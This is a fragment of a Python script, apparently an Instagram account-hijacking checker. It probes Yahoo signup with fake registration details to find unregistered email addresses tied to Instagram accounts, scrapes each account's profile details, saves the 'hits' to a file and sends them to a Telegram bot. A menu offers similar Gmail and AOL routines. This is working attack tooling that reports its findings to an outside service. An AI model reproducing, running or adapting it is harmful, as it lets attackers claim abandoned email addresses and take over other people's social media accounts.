H1c4EsctXMfykTgTtj%2F59BIkXdnYOwaz%2BpfMNn0oVgPmeJ59BFkeQUSPcYLX8oTyKdGZKyx5USDU2poXyxmthkRXf1cmI8EYiQJppSNFfIZwpb%2BsiMauJMJ4BozCPNrDzR7XLbM%2FQt7kf70ynHOXqGKetd6T6lozjJIf9xTO%2BR3XL4ZwBmiNVBvUg4nIBDHRNZpNIW6hap%2FNQOBCLpShxtUztE1fXcMP%2BqPqTyx%2BAvmOZOrxwDOtTXjPYUsXid%2FA%2F6joanvP%2F4jfNR3DCCnWVzFh8j1Cg69hKRAp8t291%2BBE%2FiS8xr%2B4Szqy7eUrGqohmPGm9upFNrQupUz41%2BzQ4VE%2FqsaQhe8HY%2BCoveWZpK%2FJjPNeNf%2BnDqjR3DSETWjkTlWKsqPuF2Bl3dbf%2F2gq7SoNsfFp5FdvQyh6ich47SHGnJWMKtQCLcMOdKqEos3IPuUw%2FIusFM%2B5i8TDRTNIxHRMk2r1LhOKN%2Ba4GZCt3i%2BcDD%2BauvlUYfi8S3Y44KNrJlojtwfW2byCV0Hd2xCfJ7VGr9yna%2FcIW5JJhbA93qdRhLbKNhlGfImHwjR7facVlK1nTdbL38deXOjc8dVpxbrcO%2FcGbS4F4yFEyeJpZrigWltg92wqKRaONrOkI1yJAR50lrTodsKSiivM%2F2xb6eUhU5SM5VHCOe1xUlihsvBznlGGyZGNr6xkVtIxHNyhQ7v4QuqxzKd4Oi9L3QykZsOT6WlxWZm8AOmIgbQ9X2%2BiVIguQ8wfRwgqJCfANdPmM3Fvl3DQEzHqei89CdjbvzINTN3%2F%2BLGTrewxVaXTRgtOxb2AlN1o%2BJyDg4u5gCA4pHQ1Mhuf9%2FZNcrnpXIYg%2F%2FEoORSKeO4jnhP9rs4KBdpmq3qa%2F9ZPPLkSpvt9nVUNBWejdBCoJTRmfX0UR%2Fi7AdTjxGl8lVfLX5jK%2BL8WTsMslbblVRkH8%2FshMpoZeFImUea2nzDk25xqDUn%2FOVWIc9VysBF%2FKCdqheDRo2Wcy4bu3i6%2FhcGJhziZrM7BOl5ba81JHsHAnVOvSB5Inz2raDqpCrihNF8l5XvvT0k%2BJcqGNz%2FcwtR4sP6Pxx24sJMzxQiXJggM7R03043PxboZKWfJ%2FNAaoA8IZTLUXDSXnM9RCH8oC9QkYNyMm62ebbtuI%2BbEG2s6aoKWA%2Fj8hPnqy2jySuKcuxWlEh%2BXNVwA4cFaOdUr%2FP7Q4jrjBzkq8cfHRTYQddfOJFlecbArYlu4DaxtuLzeNvcxR1RDOQU3YLJVnpfTWz0TECKN2rss1ECyZaQ44PRsIPSKsuoit9iB0xxcI4MXNfXQNMRTvcwM4fsREGbpt7Qg%2ByQk4r6r1Abj0ly0lAgGRTAax%2FHDh2v%2ByLrhmPF6QFabcX4CxgVHwxxVKk%2B%2Bura0iNIcuCyyXfjQGKX8CzWh0npVADE0KhnNC%2FIA5DeZVYXUsHQHCLLs8aDvnT4xdeKjzniH3UI21MV%2BhCMI6CGqF0oL%2Bkpk9lNv47ZbgKTuIvUo34NVK5QkIwQVht%2Fdbm%2FfqqynvoxL2eZZoTIGUvdLt9Yep4E6W4lYOUlHGKww9clV8S0R6%2BwavhXLWva%2B5VT24E%2BRO%2Fx74uugQm0ECCvvlPZgYM%2BbBDqwXpZlAll9TycAFmh%2BJBP1xzYQ7ytO8A5Fppt3ZZ87hnKEKNM6%2F%2BQcetJyZrgYVvfHBFGI824dsrErWbD%2FuFzWrClhiSsZJVWFgyYLD24Zvv2hqj6sSA8wz9W0SlXfwA0MMzJYJc2c1GdcyitYX74z%2BGHxp9WXybqlu0GHN71rQN7FQLApQeUZII40GHeUyXQDmnzuo7EJdP0MVg6UBW1GrMmo9OQkn2IrAIaOODlNHvnmueo3mGuYGRti2QPLoOSWyO8XGl7WNPvEchWJS7BKL%2BBUuSCdPosZy%2BuF%2B6U2ym1FtCBNvmNxILAsCL1HOpXhtdVedQX0LAOQIMOBnEGyMdt%2FNDokI0nbYjoGG29eP5lnMMNbinV4HXSOvqZoYK6Zug5nt5hdRY%2BX2fMvK%2FNX4ZbWIcZjije6CZGkrn25OmUQiZUBXv4jp8jqEA7vAJMsKeKBuaPh2IxK6oeciPCC%2B8eSzn8z0YEumeEj9LLyc4XeDxKQcWVQrPHvBAevdT2biyUesKIn80rnPktUSE36%2BLC9rK%2BP8Sf80HwWUirAvOnAr6xOdFJTeNS2GD2%2F42VaZvv6PMKSp0Yg5vrGToPPNEVC1LIGOVG5MNVnFuQKAkpQjPV12%2FHZPgWv%2F4mp6Mjy99k4%2FNxfzxKMfQu%2FKZ8XoVwHzwXGjrKOi1PPzDTY%2BfnnE1owH6d9LxlTrV3JwbLJU%2F3hGi01ktWL4pJNLpcwEncfcCyHOx41KiMgKn%2FIaGcRozmvqqvcyry00VJQF56HOYNWIj0Uxh%2FJ%2B5hd0T1tpI54J1h8y%2BOn6vK%2F8DsVOIebtsRbxwFdWYeM%2FqcEDVUtctJkJRNmNYa4mSyDiTKTsD%2F%2FQOfU0qBW%2FAIht0hHRhIJoxbIawuYeh0sNvOCFRiXl6mHtSYhYX5SWgDrOHLw2Q0VdCYiiVuji6AfbAwLADD1UkTkGYRGr76UrWahgiicXLIcx4Hvnz04N%2B3jR2DUONQzCl7XqSQ50k%2FCv3SULW13XL7a5Kd7jepA%2BCL9Vr4xQ34kTl16EdOrAO%2BSUcMIuABnkWlKgb%2BVSy5j6hy%2Bpt0quRMdfnisZqwnTdjMJ5Lg15FLplRV0WwInKqUuwzmr4eudCrlIbezmseC7y3fJXO%2FPzi%2Bu1bx0Vd10jVnQE3oTKEsn8WEWGyDa6CrZMshbn3imNxYtHp7i7i9otz8JZ1soz2srzMo2pPJMfXxavlgiffWI6hG7WBZzvpbBrbBOZ9MWKKWraJKRDu9mTAB%2Fg3rf2bnh2bJtLnQt0%2BBhvwpNDsNCBySRh4wtITxvCp1hYSWY%2Bd276c4sERE%2BvZo4v0NHZiEdrLZQuS8FCrc3VcagcT%2FkD0e0IqtFobE2MYUoTgIA92PUpwG2Iex4Yn7%2FI7PPyFwa%2FfPlLaHaGCcTmFclGio7Rexb%2FKy5W5%2B0zCInmFnyX2OmN96nY9nRWxRv08WARSl3DgtV0jU%2BBTbHUc%2BRVO9YdznpO3VnEYAJFEFkDZ06UuzSaGNesxlWLi4lu482c5i7K7PAiMG92%2Fk%2Fd4z815q92ega8IuXmWAAuKoLBlYXDVGO3wYzWpv6znvma9ZZl93Bu5ygTAy7CvCNGw9DCiPeFvHHba4tiYviSTwYrvKFAa01qYayvNnrcJ%2BtkRPHBlD4GSiTuQebjqMoOmXygvQsNHBMZfmCD8zqtu23bJ3Z0aOqX80v8p%2FroYKOQkkLMG7KHIEbukV2D8BQTRF6ypF9hhXnHdueOyckqLjmUQ6%2Fr12PIlnTgS0XqWcrrGgHtZJeOylm9Jqmx80p%2B9aj2xPVfvlP6Sc5wTpq61m%2FIo8IaN%2BHdFOkQ2ZBAzimqVlkf%2BIVLsxxF0MUsty3kzNIcs1yid0ivqRPtXFS3rOXuDVeP24aIZkH6vH04LZXs9IIKXLOEDuWgQZ3Jb7dMh5PcVGZ8kqRXhrF1zkF6XFBYX%2F7o6IBKFoMJGH%2Fp%2BEHPEgV%2Ba4NCuYpmVKdCYV0tORqMP3bdZaXEfgTXmCuLr2K%2Bdh4yOp%2Fu7DGrWbaUhPLfRLB0wBo8spFPpoSZmZK4VMm5Yz9eizh5G1nXO5Ts9P8R9jiVqhrTFwcrwnEpVPQe8wKL9Wd6QyHaBecyYkUlJZ88ZRgIPijHDxLhyODrl%2BfngJewh%2FyWm37R9edAdmhtwSm%2FuOHeZYf9h0YAcCxKEgPTO0zdsuySr4HrvqcZF%2F2pmsua4VR0dxej5dDkX9JdiQb4AgXLQ3BJfkNdadnVHmG2wCgtGA2Sw2f8n22g584eoN0y1USEFoyhQigFW%2FDHcOqjoJdGge3Be5FBHo5Ye7jfKCvbuhlF9wOg%2FROOWVHCb6%2Bpc%2B4uWeG1a3i%2Fwgh8Jr38okT1CK%2FjuEEhGPztb9SCjPpnhf9S42E61ItaWucoNwWF3hTFWlLmtrOWZ4rNTgxHU%2FEpA%2BhriKjxdRUZeM4oTViAAtukIoz9TI%2B8N2g%2BA8WeKqdosk%2FhIiQtr3yFGnBYMiKSl2NWu2zTkweWuaNTdF90lm%2BSyn7ddAQBTlbiIKGepnihTiCrm%2BemWMK%2F5TD45L1v63zAnUL4en8s6tCEeGKfgDGaG1Z24RawwdE9EdSN8lUzQ9nEKldeNVRm2uq%2BIW1GPsS4gcCC8qPXvFWOak08nG5X1E2LAJVkAXeaJuphTCyo5UEQJCfgvJEodJagJj1mJ5a25iM1YfWJtbAYLOAYMwEXBL8tCZXHfQwsfkFC9KVAhdSB5%2FYRE4i0Z84KFAhtr%2BabsjfW42cLdL5fUN6VKbflxtol9%2BHpbijz9CuyhT99RHUiXLGOeFjpuyL04wJuREY0V%2FUAywVBDGmauqWEgI8Bv2Wo4CyxSKOtMLPiCHJ4Riu6Zs5SOXp9Dlucoe%2FpMMjT%2BdVEhQ9VvPkrJW5mYMu7nhq%2Bu9wdTBmjWRxt2KOCpsEJEk%2BoFVYEcd8e3Hu8ZMGdWpMUBoEL5AdFgSQIiMQWVXt1sLnlxQQL5%2FTfTW9YcBvK0UMLmIxwSkSH%2BzxS6gz3Vi5oeBT8A5neQ1Vwh27nKp2Lpk0jgTDkUWocmtILl3xEA76%2FQ%2BQR8DF6%2F%2BAp3xA4M0VDpgE3wsIZwjsjbuBvad387k%2Fcj%2FdxL3rfq8HBleUAHzl%2BVeSY9l4e2djuA9sweGueMXsq92xdZ5l5T0W%2FE9bm%2FVDP%2BzmioRE123ESFMaXMwmo4FfNEpCUqS6gmNkJlCfo4jNAuVoOvB7sOk4kqiwU5Y3QrcOuB8YwXB4rulkEEANF80hFPstTt5Mrgy0KVl0FUAnGjCDx3VBpKrqtn%2B8uPZG4GJwUVt2tybYzsNy%2B%2Bz8TjExziL9s0zZRSVa%2F8wVz%2Fx6zVs8w5EmtUZUJJSSVx%2FrGpxKcMuB%2BCvsp3QA8WZZoD6vz0ik6Ztays60ecQGJRi%2FExrKMbnq5M3KMcctvii4q7PbjRWMtp9dkWhoQvdSraKONKUukuRO%2F0nLN3QVAxQpi2i3z5CqXZ7R9i04uxYx%2BaeyIuRb30HP0x7H8VAZTmIpPHFVPo22%2F8%2FeyG%2F%2BuzbYa95k2GUiUqvr3az3YxbtqsDAmflt4smp6pgfSJ5O%2B5B1XSatt%2FWxuowILkQ%2Fk7zHqJkS%2Bsig0ET1mnOp9YwnfNeYYM0K%2B%2FnMuoWDanE5N6voySbrwL1gewWqlh1CaHSkopKLbgGYrcSNx%2Fs4jvtcbhdGHflkFesVgaZbFt4iq6Z%2B3z85BZiMxFvNEzYY0dOJsA9bSaXbUsATXdkXu0xJAPHul87Qfh2MSrjuQkkAGEYSQotzjRQbih5DjyiEgNq%2B%2BF9YQ%2BanS1p3vgYpaKyoDk4AFYnjQPRNjwio08YSHxjV9jLLny1TlaKsyCJj7x7mA9EkwXpR0HrvJCI4HN0%2FCbiV2tbBuvxpmp0XW8DHbiSBFykaO%2Bo3hMz28TWMSxcaEkPAVVPqa4iNMVmpbcksExTWlcnkJE%2FQzHUgtlZjiYJyzP%2Boh6GPvTwEpQCulJhJz5sV0exXDCj9SfP9KIQA4ceemRModEG%2Bui%2F5i2vK%2FyWqGk5CZDz8n0Zts57vdcgszUU0Q9U0i1eClzAQThFEtoZ7kKlCeD897gMgEnBAtXpLliDf9hJPfZFM08ZQmn3DzoLSUzXZiCDLl5vfmNCg%2B38tBqLMpE64leDuGBBhuMiciCObKNI9Km79qvLuEwp5RYlAle8%2FmhPWKdmjIrcdoO6bdVbpA1whM0QLcZDL0%2B6LKkD2S9%2B7wREf88ynb0Pc%2FxZsBunc%2FXpIuLsv0bE4d9TWVjkNED2pZUDJ%2BzL1DRb12JGJfeyjtOs3MCAM02HFEioW8fa6S8Dx66FxKXUVAE69VbWAOtNqJWiiF18MZ8V5NUgWxiivkr4nf9wXynxMmcUJlQlylvVsJYUOFdQ2CeRIvN%2F5adzasy82L7WMV0Qlnba%2BGiwSDHzZrvW66RMK994Hb0wZiDVeRU5Wez6OoHdqiV%2BFV%2BXYg6tyaf783cdrNgP%2Bie7jIRNAkrRu%2FvEzwLjFfY85w7iL%2BLbACmtsXfYehVWD19Cqjjm21AFXSK3lOJQDfSb3yUO7b0uuCbVlzIF5%2F1MXEBp%2FM6qS63ZEutY9v1i1i%2FS%2F9%2FEOo2SNUFtLiAxH1pHNycDmGGxq9Cx0vFjkpzB25DrCiuYFn6%2Bjib%2BLmV8DzWPIslM4G2c%2F9Rwmv2LOvkLYsI3AYFuGccr99WbgAcIItRZn9qyfzyP7tI1AQGcPPcefWjOct#HDgLURq2EszkDhZFm7S0U7veL6bp9pduwJBT7qBV4OnDqkYSz%2BFl6WQnWai%7CWt01JXqufq00jQOn6sPJiA%3D%3D%7CLuskmpN4HZ%2BfFTJdCk2ftg%3D%3D&tos0=oath_freereg%7Cus%7Cen-US&firstName=uu&lastName=uu&yid="+tik+"&password=pkwwhiaijwwh&shortCountryCode=IQ&phone=07849558853&mm=7&dd=1&yyyy=1972&freeformGender=&signup=").text
        if 'bad_password' in res and "yid" not in r:
            req = requests.get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username="+tik+"",headers = {
	"accept":"*/*",
	"accept-encoding":"gzip, deflate, br",
	"accept-language":"ar,en-US;q=0.9,en;q=0.8",
	"cookie":"ig_did=E216FCAE-3C47-471C-AB2F-D377B8091E28; ig_nrcb=1; dpr=2.25; datr=zFcNY8ic1_0Zt9CTOz2PrfX_; mid=Yw1YLQABAAEmMXeFTgUHfw-N8u1Y; csrftoken=bVOP67kvfqUJagmCKcxDQ8OCKlenCArl",
	"origin":"https://www.instagram.com",
	"referer":"https://www.instagram.com/",
	'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"', 
	"sec-ch-ua-mobile":"?1",
	'sec-ch-ua-platform':'"Android"',
	"sec-fetch-dest":"empty",
	"sec-fetch-mode":"cors",
	"sec-fetch-site":"same-site",
	"user-agent":"Mozilla/5.0 (Linux; Android 11; SM-A022F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36",
	"viewport-width":"320",
	"x-asbd-id":"198387",
	"x-csrftoken":"bVOP67kvfqUJagmCKcxDQ8OCKlenCArl",
	"x-ig-app-id":"1217981644879628",
	"x-ig-www-claim":"0"}).json()['data']
            user = req['user']['username']
            name = req['user']['full_name']
            follower = req['user']['edge_followed_by']['count']
            following = req['user']['edge_follow']['count']
            bio = req['user']['biography']
            id = req['user']['id']
            bus = req['user']['is_business_account']
            private = req['user']['is_private']
            verified = req['user']['is_verified']
            posts = req['user']['edge_owner_to_timeline_media']['count']
            rs = requests.get(f'https://o7aa.pythonanywhere.com/?id={id}').json()
            data = rs['date']
            info = f'\n email : {email}\n name : {name}\n followers : {follower}\n following : {following}\n bio : {bio}\n id : {id}\n Date : {data}\n posts : {posts}\n business : {bus}\n private : {private}\n verified : {verified}'
            print(G+info+G)
            with open('hit instagram.txt','a') as hit:
                hit.write(f'{email}\n')
            reg = requests.post(f"https://api.telegram.org/bot{token}/SendMessage?chat_id={iid}&text=‹ ѕᴜᴄᴇѕѕғᴜʟʟ ᴇᴍᴀɪʟ  ❤️‍🔥\n────── • ✧✧ • ──────\n{info}\n────── • ✧✧ • ──────\n- ᴅᴇᴠ •@H_8_K")
        elif 'invalid_user' in res and "yid" not in r:
                h+=1
                print(f'[{h}]'+'❌  '+R+'bad insta ==> ' + email)
        elif 'bad_password' in res and "yid" in r:
                h+=1
                print(H+f'[{h}]'+'❎  ' + H+'bad email  ==> ' +   email)
        elif 'invalid_user' in res and "yid"  in r:
                h+=1
                print(f'[{h}]'+'❌  '+R+'bad all ==> ' + email)
        else:
                print(res,r)         
if took =="1":
    gmail()
if took =="2":
    gmailsc()
if took =="5":
    gmaillist()
if took =="4":
    gmailfolr()
if took =="3":
    gmailfolg()
if took =="6":
    aol()
if took =="7":
    aolsc()
if took =="8":
    aolfolr()
if took =="9":
    aolfolg()
if took =="10":
    aollist()
if took =="11":
    s()